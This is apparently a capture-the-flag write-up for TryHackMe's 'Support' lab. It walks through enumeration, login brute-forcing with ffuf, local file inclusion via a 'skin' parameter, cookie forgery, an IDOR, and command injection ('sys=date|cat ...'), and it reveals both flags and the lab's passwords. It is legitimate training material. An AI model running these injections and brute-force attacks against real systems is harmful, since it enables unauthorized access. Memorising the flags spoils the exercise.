
Hi! This is a writeup for a CTF *Support* from TryHackMe Jr Penetration Tester path. If you stuck and need a hint, feel free to check it out.

CTF description:
*A new internal **Support Operations Platform** has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.*

*Can you pentest the platform and escalate your access to achieve RCE on the server?*

There are two flags to grab, first one after logging in as an admin, and the second one is in the `/home/ubuntu/user.txt`. So, let's begin!

As always first thing to do is nmap scan, I done mine with `nmap -A -v -T4 -p- MACHINE_IP`.
The results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1a:82:94:95:1b:28:ad:0d:37:eb:0b:68:51:b0:8d:45 (ECDSA)
|_  256 e9:45:60:7c:13:e2:34:8d:46:b8:84:99:96:30:d9:09 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Support Operations Panel
```

I'm gonna start with a web server on port 80 which runs on Apache/2.4.58.
I also started fuzzing hidden endpoints and files with `gobuster`: `gobuster dir -u 'url' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js,.py -b 403-500`.
The results:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api.php              (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/footer.php           (Status: 200) [Size: 1253]
/includes             (Status: 301) [Size: 317] [--> http://10.113.138.25/includes/]
/index.php            (Status: 200) [Size: 2591]
/info.php             (Status: 200) [Size: 73313]
/js                   (Status: 301) [Size: 311] [--> http://10.113.138.25/js/]
/layout               (Status: 301) [Size: 315] [--> http://10.113.138.25/layout/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/skins                (Status: 301) [Size: 314] [--> http://10.113.138.25/skins/]
Progress: 163752 / 163760 (100.00%)
===============================================================
Finished
===============================================================
```
The interesting file is `info.php` where there is whole server configuration, which is very interesting, but i couldn't find anything useful in there.

After navigating to main page and checking source code, there is nothing worth noting.
There is a login form on the page, which uses specific email format - `help@support.thm`.
So, I tried to bruteforce `admin@support.thm`, because after checking, there is no rate limit.
I used `ffuf` with a command: `ffuf -u http://10.113.138.25 -w /usr/share/wordlists/rockyou.txt -X POST -d "email=admin@support.thm&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid credentials". 
No luck here, so I tried bruteforcing `help@support.thm` instead.
With a command: `ffuf -u http://10.113.138.25 -w /usr/share/wordlists/rockyou.txt -X POST -d "email=help%40support.thm&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid credentials"`
I found the password which is `snoopy`.

After logging in I noticed that I can change themes, of the page to different colors. the URL changes, and there is a `?skin=red`. So, I tried to access php files that i found earlier, `api.php`, and `config.php`.
There is LFI vulnerability here, and when changing skin parameter to `?skin=../config` I was able to view a part of a `config.php` file in source of the page, where master password of database was included: `$MASTER_PASSWORD = 'support@110';`

The `?skin=../api` has interesting results too, there is a line of code:
```

if (($_COOKIE['isITUser'] ?? md5('false')) !== md5('true')) {
    die('Access denied');
}
```
Which tells that my cookie `isITUser` must be set to a value of `true` encoded to md5. In order to access `/api.php`. So i tried that.
First I wen to `hashes.com` and decrypted my current `isITUser` cookie, which was in fact set to false.
So I changed it to `true` - md5 hashed (b326b5062b2f0e69046810717534cb09).
I changed my cookie in the storage tab in the dev tools, and I was able to visit `/api.php` page.

The `api.php` says that I can query my own profile with `GET /user/3`, which is true. The response contains, `email, 2FA, admin` values.
But what If i can query other users? It would be an IDOR vulnerability.
So, I tried `/user/1`, and... Just like that, I had admin email address - `specialadmin@support.thm`, no 2FA set.

Now, I need to sign in as an admin user. After playing around, bruteforcing, etc., I found that the password is `support110`, almost like one to the db, but without a `@` symbol.

And after logging in there was first flag: 
**THM{I_AM_ADMIN999} **

The second, and last flag should be in `/home/ubuntu/user.txt`, so I tried again messing with `?skin` parameter again, knowing that there is LFI vuln, but the hard part is that `skin` parameter doesn't accept file extension, like `.php`.
After some time I went back to the app web page and I noticed that there is date checking feature next to *select theme*. I checked the request and it has a parameter `sys=date`. 
So, I tried Remote Code Execution. 
I edited the original request and added pipe after date, like this: `sys=date|whoami`, and I saw `www-data` in the response!
RCE confirmed.
The final payload to read the second flag was: `sys=date|cat%20/home/ubuntu/user.txt`

Second flag: **THM{GOT_THE_FLAG001}**
